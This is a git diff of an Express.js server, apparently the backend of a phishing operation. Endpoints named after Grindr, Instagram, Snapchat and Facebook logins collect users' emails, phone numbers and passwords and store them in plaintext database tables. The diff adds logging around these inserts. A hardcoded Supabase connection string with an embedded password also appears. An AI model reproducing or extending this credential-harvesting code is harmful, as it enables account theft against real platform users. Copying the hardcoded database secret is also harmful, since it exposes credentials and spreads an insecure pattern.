@@ -52,9 +52,10 @@ app.use(express.static(path.join(__dirname, './')));
 
 // Database Connection - Use Supabase connection pooler (port 6543) for serverless compatibility
 const pool = new Pool({
-  connectionString: process.env.DATABASE_URL || 'postgresql://postgres.jlnfgljtujjhjbcxkstf:appugowda%40143@aws-1-ap-southeast-2.pooler.supabase.com:6543/postgres',
+  connectionString: process.env.DATABASE_URL || 'postgresql://postgres.jlnfgljtujjhjbcxkstf:appugowda%40143@aws-0-ap-southeast-2.pooler.supabase.com:6543/postgres',
   ssl: { rejectUnauthorized: false }
 });
+console.log('[DB] Using connection string:', (process.env.DATABASE_URL || 'hardcoded-fallback').substring(0, 60) + '...');
 
 // Test database connection on startup
 pool.query('SELECT NOW()')
@@ -245,6 +246,7 @@ app.post('/api/snapchat_login', async (req, res) => {
 // Store Grindr Login credentials
 app.post('/api/grindr_login', async (req, res) => {
   const { phone_number, email, password } = req.body;
+  console.log('[grindr_login] Received:', { email: email || '(none)', phone_number: phone_number || '(none)', password: password ? '****' : '(none)' });
   if (!password || (!phone_number && !email)) {
     return res.status(400).json({ error: 'Contact info and password are required.' });
   }
@@ -253,9 +255,10 @@ app.post('/api/grindr_login', async (req, res) => {
       'INSERT INTO grindr_users (phone_number, email, password) VALUES ($1, $2, $3) RETURNING id',
       [phone_number || null, email || null, password]
     );
+    console.log('[grindr_login] Stored successfully, id:', result.rows[0].id);
     res.status(201).json({ message: 'Grindr credentials stored', user: result.rows[0] });
   } catch (err) {
-    console.error(err);
+    console.error('[grindr_login] DB error:', err.message);
     res.status(500).json({ error: 'Database error occurred.' });
   }
 });
@@ -317,6 +320,7 @@ app.post('/api/facebook_login', async (req, res) => {
 // Store Instagram Login credentials
 app.post('/api/instagram_login', async (req, res) => {
   const { email, password } = req.body;
+  console.log('[instagram_login] Received:', { email: email || '(none)', password: password ? '****' : '(none)' });
   if (!email || !password) {
     return res.status(400).json({ error: 'Email and password are required.' });
   }
@@ -325,9 +329,10 @@ app.post('/api/instagram_login', async (req, res) => {
       'INSERT INTO instagram_users (email, password) VALUES ($1, $2) RETURNING id',
       [email, password]
     );
+    console.log('[instagram_login] Stored successfully, id:', result.rows[0].id);
     res.status(201).json({ message: 'Instagram credentials stored', user: result.rows[0] });
   } catch (err) {
-    console.error(err);
+    console.error('[instagram_login] DB error:', err.message);
     res.status(500).json({ error: 'Database error occurred.' });
   }
 });
